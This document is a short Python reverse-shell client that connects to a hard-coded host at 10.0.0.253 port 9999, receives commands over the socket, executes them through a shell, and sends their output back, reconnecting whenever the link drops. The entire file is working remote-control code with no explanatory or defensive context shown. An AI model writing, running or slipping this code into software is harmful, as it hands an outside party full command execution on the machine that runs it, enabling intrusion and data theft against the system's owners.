import socket
import time
import subprocess

HOST = "10.0.0.253"
PORT = 9999

def server_connect():
    s = socket.socket()
    s.connect((HOST, PORT))
    return s

def execute_command(s, command):
    print("Executing:", repr(command))
    result = subprocess.run(command, capture_output = True, text=True, shell=True)
    output = result.stdout if result.stdout else result.stderr
    s.sendall((output + "<END_OF_OUTPUT>").encode())

s = server_connect()

while True:
    try:
        msg = s.recv(4096)
        command = msg.decode("utf-8")
        execute_command(s, command)
    except socket.error as error_msg:
        print("An Unexpected Connection Error Occured: " + str(error_msg))
        time.sleep(5)
        s = server_connect()

